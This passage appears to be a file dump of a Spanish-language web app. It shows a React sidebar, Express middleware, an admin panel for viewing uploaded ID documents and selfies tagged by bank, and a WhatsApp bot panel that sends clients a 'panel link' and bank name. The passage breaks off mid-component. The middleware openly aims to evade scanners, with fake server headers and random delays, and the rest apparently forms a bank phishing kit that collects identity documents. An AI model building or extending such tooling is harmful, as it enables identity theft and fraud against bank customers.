md:opacity-0\",\n        className\n      )}\n      {...props}\n    />\n  )\n})\nSidebarMenuAction.displayName = \"SidebarMenuAction\"\n\nconst SidebarMenuBadge = React.forwardRef<\n  HTMLDivElement,\n  React.ComponentProps<\"div\">\n>(({ className, ...props }, ref) => (\n  <div\n    ref={ref}\n    data-sidebar=\"menu-badge\"\n    className={cn(\n      \"absolute right-1 flex h-5 min-w-5 items-center justify-center rounded-md px-1 text-xs font-medium tabular-nums text-sidebar-foreground select-none pointer-events-none\",\n      \"peer-hover/menu-button:text-sidebar-accent-foreground peer-data-[active=true]/menu-button:text-sidebar-accent-foreground\",\n      \"peer-data-[size=sm]/menu-button:top-1\",\n      \"peer-data-[size=default]/menu-button:top-1.5\",\n      \"peer-data-[size=lg]/menu-button:top-2.5\",\n      \"group-data-[collapsible=icon]:hidden\",\n      className\n    )}\n    {...props}\n  />\n))\nSidebarMenuBadge.displayName = \"SidebarMenuBadge\"\n\nconst SidebarMenuSkeleton = React.forwardRef<\n  HTMLDivElement,\n  React.ComponentProps<\"div\"> & {\n    showIcon?: boolean\n  }\n>(({ className, showIcon = false, ...props }, ref) => {\n  // Random width between 50 to 90%.\n  const width = React.useMemo(() => {\n    return `${Math.floor(Math.random() * 40) + 50}%`\n  }, [])\n\n  return (\n    <div\n      ref={ref}\n      data-sidebar=\"menu-skeleton\"\n      className={cn(\"rounded-md h-8 flex gap-2 px-2 items-center\", className)}\n      {...props}\n    >\n      {showIcon && (\n        <Skeleton\n          className=\"size-4 rounded-md\"\n          data-sidebar=\"menu-skeleton-icon\"\n        />\n      )}\n      <Skeleton\n        className=\"h-4 flex-1 max-w-[--skeleton-width]\"\n        data-sidebar=\"menu-skeleton-text\"\n        style={\n          {\n            \"--skeleton-width\": width,\n          } as React.CSSProperties\n        }\n      />\n    </div>\n  )\n})\nSidebarMenuSkeleton.displayName = \"SidebarMenuSkeleton\"\n\nconst SidebarMenuSub = React.forwardRef<\n  HTMLUListElement,\n  React.ComponentProps<\"ul\">\n>(({ className, ...props }, ref) => (\n  <ul\n    ref={ref}\n    data-sidebar=\"menu-sub\"\n    className={cn(\n      \"mx-3.5 flex min-w-0 translate-x-px flex-col gap-1 border-l border-sidebar-border px-2.5 py-0.5\",\n      \"group-data-[collapsible=icon]:hidden\",\n      className\n    )}\n    {...props}\n  />\n))\nSidebarMenuSub.displayName = \"SidebarMenuSub\"\n\nconst SidebarMenuSubItem = React.forwardRef<\n  HTMLLIElement,\n  React.ComponentProps<\"li\">\n>(({ ...props }, ref) => <li ref={ref} {...props} />)\nSidebarMenuSubItem.displayName = \"SidebarMenuSubItem\"\n\nconst SidebarMenuSubButton = React.forwardRef<\n  HTMLAnchorElement,\n  React.ComponentProps<\"a\"> & {\n    asChild?: boolean\n    size?: \"sm\" | \"md\"\n    isActive?: boolean\n  }\n>(({ asChild = false, size = \"md\", isActive, className, ...props }, ref) => {\n  const Comp = asChild ? Slot : \"a\"\n\n  return (\n    <Comp\n      ref={ref}\n      data-sidebar=\"menu-sub-button\"\n      data-size={size}\n      data-active={isActive}\n      className={cn(\n        \"flex h-7 min-w-0 -translate-x-px items-center gap-2 overflow-hidden rounded-md px-2 text-sidebar-foreground outline-none ring-sidebar-ring hover:bg-sidebar-accent hover:text-sidebar-accent-foreground focus-visible:ring-2 active:bg-sidebar-accent active:text-sidebar-accent-foreground disabled:pointer-events-none disabled:opacity-50 aria-disabled:pointer-events-none aria-disabled:opacity-50 [&>span:last-child]:truncate [&>svg]:size-4 [&>svg]:shrink-0 [&>svg]:text-sidebar-accent-foreground\",\n        \"data-[active=true]:bg-sidebar-accent data-[active=true]:text-sidebar-accent-foreground\",\n        size === \"sm\" && \"text-xs\",\n        size === \"md\" && \"text-sm\",\n        \"group-data-[collapsible=icon]:hidden\",\n        className\n      )}\n      {...props}\n    />\n  )\n})\nSidebarMenuSubButton.displayName = \"SidebarMenuSubButton\"\n\nexport {\n  Sidebar,\n  SidebarContent,\n  SidebarFooter,\n  SidebarGroup,\n  SidebarGroupAction,\n  SidebarGroupContent,\n  SidebarGroupLabel,\n  SidebarHeader,\n  SidebarInput,\n  SidebarInset,\n  SidebarMenu,\n  SidebarMenuAction,\n  SidebarMenuBadge,\n  SidebarMenuButton,\n  SidebarMenuItem,\n  SidebarMenuSkeleton,\n  SidebarMenuSub,\n  SidebarMenuSubButton,\n  SidebarMenuSubItem,\n  SidebarProvider,\n  SidebarRail,\n  SidebarSeparator,\n  SidebarTrigger,\n  useSidebar,\n}\n","size_bytes":23337},"server/middleware/security.ts":{"content":"import { Request, Response, NextFunction } from 'express';\n\n// Middleware para ofuscar headers y evitar detecci贸n\nexport const obfuscateHeaders = (req: Request, res: Response, next: NextFunction) => {\n  // Ocultar headers que pueden revelar la tecnolog铆a\n  res.removeHeader('X-Powered-By');\n  \n  // Agregar headers falsos para confundir scanners\n  res.setHeader('Server', 'nginx/1.20.1');\n  res.setHeader('X-Framework', 'Express/Custom');\n  res.setHeader('X-Version', '2.1.3');\n  \n  next();\n};\n\n// Middleware para simular diferentes comportamientos de servidor\nexport const serverMasking = (req: Request, res: Response, next: NextFunction) => {\n  // Simular delay de red variable\n  const delay = Math.floor(Math.random() * 100) + 10;\n  setTimeout(next, delay);\n};\n\n// Middleware para detectar y bloquear bots conocidos\nexport const botDetection = (req: Request, res: Response, next: NextFunction) => {\n  const userAgent = req.get('User-Agent') || '';\n  \n  // Lista de bots conocidos\n  const botPatterns = [\n    /bot/i,\n    /crawler/i,\n    /spider/i,\n    /scraper/i,\n    /headless/i,\n    /phantom/i,\n    /selenium/i,\n    /webdriver/i,\n    /puppeteer/i,\n    /playwright/i\n  ];\n  \n  const isBot = botPatterns.some(pattern => pattern.test(userAgent));\n  \n  if (isBot) {\n    // Solo log para monitoreo, pero permitir acceso\n    console.log('Bot detected but allowing access:', userAgent);\n    // Agregar header para identificar internamente\n    res.setHeader('X-Bot-Detected', 'true');\n  }\n  \n  next();\n};\n\n// Middleware para ofuscar errores\nexport const errorObfuscation = (err: any, req: Request, res: Response, next: NextFunction) => {\n  // No revelar stack traces o informaci贸n sensible\n  const sanitizedError = {\n    message: 'Error interno del servidor',\n    code: 500,\n    timestamp: Date.now()\n  };\n  \n  // Log real del error internamente (sin exponerlo)\n  console.error('Error real:', err);\n  \n  res.status(500).json(sanitizedError);\n};\n\n// Rate limiting con fingerprinting\nexport const dynamicRateLimit = (req: Request, res: Response, next: NextFunction) => {\n  const ip = req.ip;\n  const userAgent = req.get('User-Agent') || '';\n  const fingerprint = Buffer.from(`${ip}-${userAgent}`).toString('base64');\n  \n  // Implementar rate limiting basado en fingerprint\n  // (Esta es una versi贸n simplificada, en producci贸n usar Redis)\n  \n  next();\n};","size_bytes":2353},"server/vite.ts":{"content":"import express, { type Express } from \"express\";\nimport fs from \"fs\";\nimport path from \"path\";\nimport { createServer as createViteServer, createLogger } from \"vite\";\nimport { type Server } from \"http\";\nimport viteConfig from \"../vite.config\";\nimport { nanoid } from \"nanoid\";\n\nconst viteLogger = createLogger();\n\nexport function log(message: string, source = \"express\") {\n  const formattedTime = new Date().toLocaleTimeString(\"en-US\", {\n    hour: \"numeric\",\n    minute: \"2-digit\",\n    second: \"2-digit\",\n    hour12: true,\n  });\n\n  console.log(`${formattedTime} [${source}] ${message}`);\n}\n\nexport async function setupVite(app: Express, server: Server) {\n  const serverOptions = {\n    middlewareMode: true,\n    hmr: { server },\n    allowedHosts: true,\n  };\n\n  const vite = await createViteServer({\n    ...viteConfig,\n    configFile: false,\n    customLogger: {\n      ...viteLogger,\n      error: (msg, options) => {\n        viteLogger.error(msg, options);\n        process.exit(1);\n      },\n    },\n    server: serverOptions,\n    appType: \"custom\",\n  });\n\n  app.use(vite.middlewares);\n  app.use(\"*\", async (req, res, next) => {\n    const url = req.originalUrl;\n\n    try {\n      const clientTemplate = path.resolve(\n        import.meta.dirname,\n        \"..\",\n        \"client\",\n        \"index.html\",\n      );\n\n      // always reload the index.html file from disk incase it changes\n      let template = await fs.promises.readFile(clientTemplate, \"utf-8\");\n      template = template.replace(\n        `src=\"/src/main.tsx\"`,\n        `src=\"/src/main.tsx?v=${nanoid()}\"`,\n      );\n      const page = await vite.transformIndexHtml(url, template);\n      res.status(200).set({ \"Content-Type\": \"text/html\" }).end(page);\n    } catch (e) {\n      vite.ssrFixStacktrace(e as Error);\n      next(e);\n    }\n  });\n}\n\nexport function serveStatic(app: Express) {\n  const distPath = path.resolve(import.meta.dirname, \"public\");\n\n  if (!fs.existsSync(distPath)) {\n    throw new Error(\n      `Could not find the build directory: ${distPath}, make sure to build the client first`,\n    );\n  }\n\n  app.use(express.static(distPath));\n\n  // fall through to index.html if the file doesn't exist\n  app.use(\"*\", (_req, res) => {\n    res.sendFile(path.resolve(distPath, \"index.html\"));\n  });\n}\n","size_bytes":2254},"client/src/components/admin/IdentityVerificationPanel.tsx":{"content":"import React, { useState } from 'react';\nimport { useQuery } from '@tanstack/react-query';\nimport { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';\nimport { Button } from '@/components/ui/button';\nimport { Badge } from '@/components/ui/badge';\nimport { Dialog, DialogContent, DialogHeader, DialogTitle } from '@/components/ui/dialog';\nimport { Eye, Download, User, FileText, Image } from 'lucide-react';\n\ninterface IdentitySession {\n  id: string;\n  banco: string;\n  documentType: string;\n  documentFileName?: string;\n  documentFileUrl?: string;\n  documentBackFileName?: string;\n  documentBackFileUrl?: string;\n  selfieFileName?: string;\n  selfieFileUrl?: string;\n  identityVerified: boolean;\n  createdAt: string;\n  createdBy: string;\n}\n\nexport function IdentityVerificationPanel() {\n  const [selectedSession, setSelectedSession] = useState<IdentitySession | null>(null);\n  const [viewingImage, setViewingImage] = useState<{ url: string; title: string } | null>(null);\n\n  const { data: sessions, isLoading } = useQuery({\n    queryKey: ['/api/admin/identity-sessions'],\n    refetchInterval: 5000\n  });\n\n  const openImageViewer = (url: string, title: string) => {\n    setViewingImage({ url, title });\n  };\n\n  const downloadFile = (url: string, filename: string) => {\n    const link = document.createElement('a');\n    link.href = url;\n    link.download = filename;\n    document.body.appendChild(link);\n    link.click();\n    document.body.removeChild(link);\n  };\n\n  if (isLoading) {\n    return (\n      <Card>\n        <CardHeader>\n          <CardTitle className=\"flex items-center gap-2\">\n            <FileText className=\"h-5 w-5\" />\n            Verificaci贸n de Identidad\n          </CardTitle>\n        </CardHeader>\n        <CardContent>\n          <div className=\"text-center py-4\">Cargando...</div>\n        </CardContent>\n      </Card>\n    );\n  }\n\n  const identitySessions = Array.isArray(sessions) ? sessions : [];\n\n  return (\n    <>\n      <Card>\n        <CardHeader>\n          <CardTitle className=\"flex items-center gap-2\">\n            <FileText className=\"h-5 w-5\" />\n            Verificaci贸n de Identidad ({identitySessions.length})\n          </CardTitle>\n        </CardHeader>\n        <CardContent>\n          {identitySessions.length === 0 ? (\n            <div className=\"text-center py-8 text-gray-500\">\n              No hay documentos de identidad subidos\n            </div>\n          ) : (\n            <div className=\"space-y-4\">\n              {identitySessions.map((session: IdentitySession) => (\n                <div key={session.id} className=\"border rounded-lg p-4\">\n                  <div className=\"flex items-center justify-between\">\n                    <div className=\"flex items-center gap-3\">\n                      <User className=\"h-5 w-5 text-blue-600\" />\n                      <div>\n                        <div className=\"font-medium\">Sesi贸n {session.id}</div>\n                        <div className=\"text-sm text-gray-600\">\n                          {session.banco}  {session.documentType}  {session.createdBy}\n                        </div>\n                        <div className=\"text-xs text-gray-500\">\n                          {new Date(session.createdAt).toLocaleString('es-MX')}\n                        </div>\n                      </div>\n                    </div>\n                    <div className=\"flex items-center gap-2\">\n                      <Badge variant={session.identityVerified ? \"default\" : \"secondary\"}>\n                        {session.identityVerified ? \"Verificado\" : \"Pendiente\"}\n                      </Badge>\n                      <Button\n                        size=\"sm\"\n                        variant=\"outline\"\n                        onClick={() => setSelectedSession(session)}\n                      >\n                        <Eye className=\"h-4 w-4 mr-1\" />\n                        Ver Documentos\n                      </Button>\n                    </div>\n                  </div>\n                </div>\n              ))}\n            </div>\n          )}\n        </CardContent>\n      </Card>\n\n      {/* Modal para ver documentos */}\n      <Dialog open={!!selectedSession} onOpenChange={() => setSelectedSession(null)}>\n        <DialogContent className=\"max-w-4xl max-h-[90vh] overflow-y-auto\">\n          <DialogHeader>\n            <DialogTitle>\n              Documentos de Identidad - Sesi贸n {selectedSession?.id}\n            </DialogTitle>\n          </DialogHeader>\n          \n          {selectedSession && (\n            <div className=\"space-y-6\">\n              <div className={`grid gap-6 ${\n                selectedSession.documentBackFileUrl \n                  ? 'grid-cols-1 md:grid-cols-3' \n                  : 'grid-cols-1 md:grid-cols-2'\n              }`}>\n                \n                {/* Documento Frontal */}\n                {selectedSession.documentFileUrl && (\n                  <div className=\"space-y-2\">\n                    <h3 className=\"font-medium text-lg\">\n                      {selectedSession.documentType?.toUpperCase() || 'DOCUMENTO'} - Frente\n                    </h3>\n                    <div className=\"border rounded-lg overflow-hidden\">\n                      <img\n                        src={selectedSession.documentFileUrl}\n                        alt=\"Documento frontal\"\n                        className=\"w-full h-48 object-cover cursor-pointer\"\n                        onClick={() => openImageViewer(\n                          selectedSession.documentFileUrl!,\n                          `${selectedSession.documentType?.toUpperCase() || 'DOCUMENTO'} - Frente`\n                        )}\n                      />\n                    </div>\n                    <div className=\"flex gap-2 justify-center\">\n                      <Button\n                        size=\"sm\"\n                        variant=\"outline\"\n                        onClick={() => openImageViewer(\n                          selectedSession.documentFileUrl!,\n                          `${selectedSession.documentType?.toUpperCase() || 'DOCUMENTO'} - Frente`\n                        )}\n                      >\n                        <Eye className=\"h-4 w-4 mr-1\" />\n                        Ver\n                      </Button>\n                      <Button\n                        size=\"sm\"\n                        variant=\"outline\"\n                        onClick={() => downloadFile(\n                          selectedSession.documentFileUrl!,\n                          selectedSession.documentFileName || 'documento_frente.jpg'\n                        )}\n                      >\n                        <Download className=\"h-4 w-4 mr-1\" />\n                        Descargar\n                      </Button>\n                    </div>\n                  </div>\n                )}\n\n                {/* Documento Reverso (solo para INE) */}\n                {selectedSession.documentBackFileUrl && (\n                  <div className=\"space-y-2\">\n                    <h3 className=\"font-medium text-lg\">\n                      {selectedSession.documentType?.toUpperCase() || 'DOCUMENTO'} - Reverso\n                    </h3>\n                    <div className=\"border rounded-lg overflow-hidden\">\n                      <img\n                        src={selectedSession.documentBackFileUrl}\n                        alt=\"Documento reverso\"\n                        className=\"w-full h-48 object-cover cursor-pointer\"\n                        onClick={() => openImageViewer(\n                          selectedSession.documentBackFileUrl!,\n                          `${selectedSession.documentType?.toUpperCase() || 'DOCUMENTO'} - Reverso`\n                        )}\n                      />\n                    </div>\n                    <div className=\"flex gap-2 justify-center\">\n                      <Button\n                        size=\"sm\"\n                        variant=\"outline\"\n                        onClick={() => openImageViewer(\n                          selectedSession.documentBackFileUrl!,\n                          `${selectedSession.documentType?.toUpperCase() || 'DOCUMENTO'} - Reverso`\n                        )}\n                      >\n                        <Eye className=\"h-4 w-4 mr-1\" />\n                        Ver\n                      </Button>\n                      <Button\n                        size=\"sm\"\n                        variant=\"outline\"\n                        onClick={() => downloadFile(\n                          selectedSession.documentBackFileUrl!,\n                          selectedSession.documentBackFileName || 'documento_reverso.jpg'\n                        )}\n                      >\n                        <Download className=\"h-4 w-4 mr-1\" />\n                        Descargar\n                      </Button>\n                    </div>\n                  </div>\n                )}\n\n                {/* Selfie */}\n                {selectedSession.selfieFileUrl && (\n                  <div className=\"space-y-2\">\n                    <h3 className=\"font-medium text-lg\">Selfie</h3>\n                    <div className=\"border rounded-lg overflow-hidden\">\n                      <img\n                        src={selectedSession.selfieFileUrl}\n                        alt=\"Selfie\"\n                        className=\"w-full h-48 object-cover cursor-pointer\"\n                        onClick={() => openImageViewer(\n                          selectedSession.selfieFileUrl!,\n                          'Selfie'\n                        )}\n                      />\n                    </div>\n                    <div className=\"flex gap-2 justify-center\">\n                      <Button\n                        size=\"sm\"\n                        variant=\"outline\"\n                        onClick={() => openImageViewer(\n                          selectedSession.selfieFileUrl!,\n                          'Selfie'\n                        )}\n                      >\n                        <Eye className=\"h-4 w-4 mr-1\" />\n                        Ver\n                      </Button>\n                      <Button\n                        size=\"sm\"\n                        variant=\"outline\"\n                        onClick={() => downloadFile(\n                          selectedSession.selfieFileUrl!,\n                          selectedSession.selfieFileName || 'selfie.jpg'\n                        )}\n                      >\n                        <Download className=\"h-4 w-4 mr-1\" />\n                        Descargar\n                      </Button>\n                    </div>\n                  </div>\n                )}\n              </div>\n\n              {/* Informaci贸n adicional */}\n              <div className=\"bg-gray-50 p-4 rounded-lg\">\n                <h4 className=\"font-medium mb-2\">Informaci贸n de la Sesi贸n</h4>\n                <div className=\"grid grid-cols-2 gap-4 text-sm\">\n                  <div>\n                    <span className=\"font-medium\">Banco:</span> {selectedSession.banco}\n                  </div>\n                  <div>\n                    <span className=\"font-medium\">Tipo de Documento:</span> {selectedSession.documentType}\n                  </div>\n                  <div>\n                    <span className=\"font-medium\">Creado por:</span> {selectedSession.createdBy}\n                  </div>\n                  <div>\n                    <span className=\"font-medium\">Fecha:</span> {new Date(selectedSession.createdAt).toLocaleString('es-MX')}\n                  </div>\n                </div>\n              </div>\n            </div>\n          )}\n        </DialogContent>\n      </Dialog>\n\n      {/* Modal para visualizar imagen completa */}\n      <Dialog open={!!viewingImage} onOpenChange={() => setViewingImage(null)}>\n        <DialogContent className=\"max-w-6xl max-h-[95vh]\">\n          <DialogHeader>\n            <DialogTitle>{viewingImage?.title}</DialogTitle>\n          </DialogHeader>\n          {viewingImage && (\n            <div className=\"flex justify-center\">\n              <img\n                src={viewingImage.url}\n                alt={viewingImage.title}\n                className=\"max-w-full max-h-[80vh] object-contain\"\n              />\n            </div>\n          )}\n        </DialogContent>\n      </Dialog>\n    </>\n  );\n}","size_bytes":12201},"client/src/components/user/UserWhatsAppPanel.tsx":{"content":"import { useState, useEffect } from \"react\";\nimport { useQuery, useMutation } from \"@tanstack/react-query\";\nimport { apiRequest, queryClient } from \"@/lib/queryClient\";\nimport { Card, CardContent, CardDescription, CardHeader, CardTitle } from \"@/components/ui/card\";\nimport { Button } from \"@/components/ui/button\";\nimport { Input } from \"@/components/ui/input\";\nimport { Label } from \"@/components/ui/label\";\nimport { Textarea } from \"@/components/ui/textarea\";\nimport { Alert, AlertDescription } from \"@/components/ui/alert\";\nimport { Badge } from \"@/components/ui/badge\";\nimport { ScrollArea } from \"@/components/ui/scroll-area\";\nimport { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from \"@/components/ui/select\";\nimport { Plus, Trash2, Send, Save, MessageSquare, QrCode, Power, CheckCircle, XCircle, ChevronRight, ChevronDown } from \"lucide-react\";\nimport { useToast } from \"@/hooks/use-toast\";\nimport type { WhatsappConfig, WhatsappMenuOption } from \"@shared/schema\";\n\ninterface MenuOptionEdit extends Partial<WhatsappMenuOption> {\n  isNew?: boolean;\n  hasChanges?: boolean;\n}\n\nexport default function UserWhatsAppPanel() {\n  const { toast } = useToast();\n  const [testNumber, setTestNumber] = useState(\"\");\n  const [welcomeMessage, setWelcomeMessage] = useState(\"\");\n  const [phoneNumber, setPhoneNumber] = useState(\"\");\n  const [editedOptions, setEditedOptions] = useState<MenuOptionEdit[]>([]);\n  const [expandedMenus, setExpandedMenus] = useState<Set<number>>(new Set());\n  const [hasUnsavedChanges, setHasUnsavedChanges] = useState(false);\n\n  const { data: config, isLoading: loadingConfig } = useQuery<WhatsappConfig>({\n    queryKey: [\"/api/whatsapp/config\"],\n  });\n\n  const { data: menuOptions = [], isLoading: loadingMenu } = useQuery<WhatsappMenuOption[]>({\n    queryKey: [\"/api/whatsapp/menu\"],\n  });\n\n  const { data: status } = useQuery<{ isConnected: boolean; qrCode: string | null; phoneNumber: string }>({\n    queryKey: [\"/api/whatsapp/status\"],\n    refetchInterval: 3000,\n  });\n\n  useEffect(() => {\n    if (config) {\n      setWelcomeMessage(config.welcomeMessage || \"\");\n      setPhoneNumber(config.phoneNumber || \"\");\n    }\n  }, [config]);\n\n  useEffect(() => {\n    if (menuOptions.length > 0 && editedOptions.length === 0) {\n      setEditedOptions(menuOptions.map(opt => ({ ...opt, hasChanges: false })));\n    }\n  }, [menuOptions]);\n\n  const updateConfigMutation = useMutation({\n    mutationFn: async (data: { welcomeMessage: string; phoneNumber: string }) => {\n      return await apiRequest(\"POST\", \"/api/whatsapp/config\", data);\n    },\n    onSuccess: () => {\n      queryClient.invalidateQueries({ queryKey: [\"/api/whatsapp/config\"] });\n      toast({\n        title: \"Configuraci贸n guardada\",\n        description: \"Tu configuraci贸n de WhatsApp ha sido actualizada.\",\n      });\n    },\n    onError: () => {\n      toast({\n        title: \"Error\",\n        description: \"No se pudo guardar la configuraci贸n.\",\n        variant: \"destructive\",\n      });\n    },\n  });\n\n  const startStopBotMutation = useMutation({\n    mutationFn: async (action: \"start\" | \"stop\") => {\n      return await apiRequest(\"POST\", `/api/whatsapp/${action}`);\n    },\n    onSuccess: () => {\n      queryClient.invalidateQueries({ queryKey: [\"/api/whatsapp/status\"] });\n      queryClient.invalidateQueries({ queryKey: [\"/api/whatsapp/config\"] });\n    },\n    onError: () => {\n      toast({\n        title: \"Error\",\n        description: \"No se pudo realizar la acci贸n.\",\n        variant: \"destructive\",\n      });\n    },\n  });\n\n  const sendTestMessageMutation = useMutation({\n    mutationFn: async () => {\n      return await apiRequest(\"POST\", \"/api/whatsapp/send-test\", { phoneNumber: testNumber });\n    },\n    onSuccess: () => {\n      toast({\n        title: \"Mensaje enviado\",\n        description: `Mensaje de prueba enviado a ${testNumber}`,\n      });\n    },\n    onError: () => {\n      toast({\n        title: \"Error\",\n        description: \"No se pudo enviar el mensaje de prueba.\",\n        variant: \"destructive\",\n      });\n    },\n  });\n\n  const createOptionMutation = useMutation({\n    mutationFn: async (option: any) => {\n      return await apiRequest(\"POST\", \"/api/whatsapp/menu\", option);\n    },\n    onSuccess: () => {\n      queryClient.invalidateQueries({ queryKey: [\"/api/whatsapp/menu\"] });\n      toast({ title: \"Opci贸n creada\", description: \"La opci贸n ha sido agregada al men煤.\" });\n      setHasUnsavedChanges(false);\n      setEditedOptions([]);\n    },\n  });\n\n  const updateOptionMutation = useMutation({\n    mutationFn: async ({ id, ...data }: any) => {\n      return await apiRequest(\"PUT\", `/api/whatsapp/menu/${id}`, data);\n    },\n    onSuccess: () => {\n      queryClient.invalidateQueries({ queryKey: [\"/api/whatsapp/menu\"] });\n      toast({ title: \"Opci贸n actualizada\", description: \"Los cambios han sido guardados.\" });\n      setHasUnsavedChanges(false);\n      setEditedOptions([]);\n    },\n  });\n\n  const deleteOptionMutation = useMutation({\n    mutationFn: async (id: number) => {\n      return await apiRequest(\"DELETE\", `/api/whatsapp/menu/${id}`);\n    },\n    onSuccess: () => {\n      queryClient.invalidateQueries({ queryKey: [\"/api/whatsapp/menu\"] });\n      toast({ title: \"Opci贸n eliminada\", description: \"La opci贸n ha sido eliminada.\" });\n      setHasUnsavedChanges(false);\n      setEditedOptions([]);\n    },\n  });\n\n  const handleSaveConfig = () => {\n    updateConfigMutation.mutate({ welcomeMessage, phoneNumber });\n  };\n\n  const handleSendTestMessage = () => {\n    if (!testNumber || testNumber.trim() === \"\") {\n      toast({ title: \"Error\", description: \"Ingresa un n煤mero de tel茅fono v谩lido.\", variant: \"destructive\" });\n      return;\n    }\n    sendTestMessageMutation.mutate();\n  };\n\n  const toggleMenu = (optionId: number) => {\n    setExpandedMenus(prev => {\n      const newSet = new Set(prev);\n      if (newSet.has(optionId)) {\n        newSet.delete(optionId);\n      } else {\n        newSet.add(optionId);\n      }\n      return newSet;\n    });\n  };\n\n  const handleAddOption = (parentId: number | null = null) => {\n    const newOption: MenuOptionEdit = {\n      isNew: true,\n      hasChanges: true,\n      parentId: parentId,\n      optionNumber: parentId ? 0 : (editedOptions.filter(o => !o.parentId).length + 1),\n      optionText: '',\n      actionType: 'message',\n      responseMessage: '',\n    };\n    setEditedOptions([...editedOptions, newOption]);\n    setHasUnsavedChanges(true);\n  };\n\n  const handleOptionChange = (index: number, field: keyof MenuOptionEdit, value: any) => {\n    const updated = [...editedOptions];\n    updated[index] = { ...updated[index], [field]: value, hasChanges: true };\n    setEditedOptions(updated);\n    setHasUnsavedChanges(true);\n  };\n\n  const handleDeleteOption = (index: number) => {\n    const option = editedOptions[index];\n    if (option.isNew) {\n      setEditedOptions(editedOptions.filter((_, i) => i !== index));\n      setHasUnsavedChanges(editedOptions.length > 1);\n    } else if (option.id) {\n      deleteOptionMutation.mutate(option.id);\n    }\n  };\n\n  const handleSaveAllChanges = async () => {\n    for (const option of editedOptions) {\n      if (option.hasChanges) {\n        if (option.isNew) {\n          await createOptionMutation.mutateAsync({\n            parentId: option.parentId,\n            optionNumber: option.optionNumber,\n            optionText: option.optionText,\n            actionType: option.actionType,\n            responseMessage: option.responseMessage,\n          });\n        } else if (option.id) {\n          await updateOptionMutation.mutateAsync({\n            id: option.id,\n            parentId: option.parentId,\n            optionNumber: option.optionNumber,\n            optionText: option.optionText,\n            actionType: option.actionType,\n            responseMessage: option.responseMessage,\n          });\n        }\n      }\n    }\n  };\n\n  const renderMenuOption = (option: MenuOptionEdit, index: number, depth: number = 0) => {\n    const children = editedOptions.filter(o => o.parentId === option.id);\n    const hasChildren = children.length > 0;\n    const isExpanded = option.id ? expandedMenus.has(option.id) : false;\n\n    return (\n      <div key={option.id || `new-${index}`} className=\"mb-3\">\n        <div className=\"border rounded-lg p-4 bg-white\" style={{ marginLeft: `${depth * 20}px` }}>\n          <div className=\"flex items-center gap-2 mb-3\">\n            {hasChildren && option.id && (\n              <Button\n                variant=\"ghost\"\n                size=\"sm\"\n                onClick={() => toggleMenu(option.id!)}\n                className=\"p-0 h-6 w-6\"\n                data-testid={`button-toggle-submenu-${option.id}`}\n              >\n                {isExpanded ? <ChevronDown className=\"h-4 w-4\" /> : <ChevronRight className=\"h-4 w-4\" />}\n              </Button>\n            )}\n            <span className=\"font-semibold\">Opci贸n {option.optionNumber}</span>\n            {option.hasChanges && <Badge variant=\"outline\" className=\"text-xs\">Sin guardar</Badge>}\n          </div>\n\n          <div className=\"grid grid-cols-2 gap-3\">\n            <div>\n              <Label>N煤mero</Label>\n              <Input\n                value={option.optionNumber || ''}\n                onChange={(e) => handleOptionChange(index, 'optionNumber', e.target.value)}\n                placeholder=\"1\"\n                data-testid={`input-option-number-${index}`}\n              />\n            </div>\n            <div>\n              <Label>Tipo de Acci贸n</Label>\n              <Select\n                value={option.actionType || 'message'}\n                onValueChange={(value) => handleOptionChange(index, 'actionType', value)}\n              >\n                <SelectTrigger data-testid={`select-action-type-${index}`}>\n                  <SelectValue />\n                </SelectTrigger>\n                <SelectContent>\n                  <SelectItem value=\"message\">Mensaje</SelectItem>\n                  <SelectItem value=\"transfer\">Transferir</SelectItem>\n                  <SelectItem value=\"info\">Informaci贸n</SelectItem>\n                  <SelectItem value=\"submenu\">Submen煤</SelectItem>\n                </SelectContent>\n              </Select>\n            </div>\n          </div>\n\n          <div className=\"mt-3\">\n            <Label>Texto de Opci贸n</Label>\n            <Input\n              value={option.optionText || ''}\n              onChange={(e) => handleOptionChange(index, 'optionText', e.target.value)}\n              placeholder=\"驴C贸mo puedo ayudarte?\"\n              data-testid={`input-option-text-${index}`}\n            />\n          </div>\n\n          {(option.actionType === 'message' || option.actionType === 'info') && (\n            <div className=\"mt-3\">\n              <Label>Respuesta</Label>\n              <Textarea\n                value={option.responseMessage || ''}\n                onChange={(e) => handleOptionChange(index, 'responseMessage', e.target.value)}\n                placeholder=\"Usa (liga) para insertar el enlace del panel y (banco) para el nombre del banco\"\n                rows={3}\n                data-testid={`textarea-response-${index}`}\n              />\n            </div>\n          )}\n\n          <div className=\"flex gap-2 mt-3\">\n            <Button\n              variant=\"destructive\"\n              size=\"sm\"\n              onClick={() => handleDeleteOption(index)}\n              data-testid={`button-delete-option-${index}`}\n            >\n              <Trash2 className=\"h-4 w-4 mr-1\" />\n              Eliminar\n            </Button>\n            {option.actionType !== 'transfer' && (\n              <Button\n                variant=\"outline\"\n                size=\"sm\"\n                onClick={() => handleAddOption(option.id || null)}\n                data-testid={`button-add-suboption-${index}`}\n              >\n                <Plus className=\"h-4 w-4 mr-1\" />\n                Agregar subopci贸n\n              </Button>\n            )}\n          </div>\n        </div>\n\n        {hasChildren && isExpanded && (\n          <div className=\"mt-2\">\n            {children.map((child, childIndex) => {\n              const childGlobalIndex = editedOptions.findIndex(o => o === child);\n              return renderMenuOption(child, childGlobalIndex, depth + 1);\n            })}\n          </div>\n        )}\n      </div>\n    );\n  };\n\n  if (loadingConfig || loadingMenu) {\n    return (\n      <div className=\"text-center py-8\">\n        <div className=\"animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600 mx-auto mb-4\"></div>\n        <p>Cargando configuraci贸n...</p>\n      </div>\n    );\n  }\n\n  return (\n    <div className=\"space-y-6\">\n      <Alert>\n        <MessageSquare className=\"h-4 w-4\" />\n        <AlertDescription>\n          Configura tu propio bot de WhatsApp para automatizar respuestas a tus clientes. \n          El bot puede enviar enlaces de panel y nombres de bancos autom谩ticamente.\n        </AlertDescription>\n      </Alert>\n\n      <div className=\"grid grid-cols-1 lg:grid-cols-2 gap-6\">\n        <Card>\n          <CardHeader>\n            <CardTitle className=\"flex items-center gap-2\">\n              <Power className=\"h-5 w-5\" />\n              Estado de Conexi贸n\n            </CardTitle>\n          </CardHeader>\n          <CardContent className=\"space-y-4\">\n            <div className=\"flex items-center justify-between\">\n              <span>Estado:</span>\n              {status?.isConnected ? (\n                <Badge className=\"bg-green-600\">\n                  <CheckCircle className=\"h-3 w-3 mr-1\" />\n                  Conectado\n                </Badge>\n              ) : (\n                <Badge variant=\"destructive\">\n                  <XCircle 